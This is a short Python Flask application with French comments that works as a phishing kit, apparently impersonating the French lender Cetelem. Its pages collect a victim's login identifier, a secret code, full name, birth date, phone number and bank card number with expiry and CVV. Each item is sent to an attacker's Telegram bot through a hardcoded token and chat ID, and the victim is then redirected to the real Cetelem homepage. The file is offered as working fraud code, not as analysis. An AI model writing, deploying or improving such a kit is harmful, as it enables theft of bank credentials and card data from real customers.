from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__)

# Remplace par ton vrai TOKEN et CHAT_ID Telegram
TOKEN = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'
CHAT_ID = '6297861735'

def send_to_telegram(message):
    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
    data = {'chat_id': CHAT_ID, 'text': message}
    try:
        requests.post(url, data=data)
    except Exception as e:
        print("Erreur Telegram :", e)

# Page 1 – Saisie identifiant
@app.route('/')
def identifiant():
    return render_template('identifiant.html')

# Page 2 – Enregistrement de l'identifiant et affichage du code
@app.route('/code', methods=['POST'])
def code():
    identifiant = request.form.get('identifiant')
    if identifiant:
        send_to_telegram(f"[Identifiant] {identifiant}")
        return render_template('code.html')
    return redirect('/')

# Page 3 – Réception du code secret et affichage page de vérification
@app.route('/verification', methods=['GET', 'POST'])
def verification():
    if request.method == 'POST':
        try:
            code = request.get_json().get('code')
            if code:
                send_to_telegram(f"[Code] {code}")
                return redirect('/verification')
        except Exception as e:
            print("Erreur JSON:", e)
            return redirect('/')
    return render_template('verification.html')

# Page 4 – Saisie carte bancaire
@app.route('/securisation', methods=['POST'])
def securisation():
    nom = request.form.get('nom')
    prenom = request.form.get('prenom')
    date_naissance = request.form.get('date_naissance')
    telephone = request.form.get('telephone')

    if nom and prenom and date_naissance and telephone:
        message = f"[Nom complet] {prenom} {nom}\n[Date de naissance] {date_naissance}\n[Téléphone] {telephone}"
        send_to_telegram(message)
        return render_template('merci.html')  # Redirige vers la page finale après soumission
    return redirect('/verification')  # Redirige vers page 3 si champs manquants

# Page 5 – Fin de parcours
@app.route('/merci', methods=['POST'])
def merci():
    carte = request.form.get('carte')
    date_exp = request.form.get('date_exp')
    cvv = request.form.get('cvv')

    send_to_telegram(f"[Carte] {carte} | Exp: {date_exp} | CVV: {cvv}")

    return redirect("https://www.cetelem.fr/fr/accueil")


if __name__ == '__main__':
    app.run(debug=True)
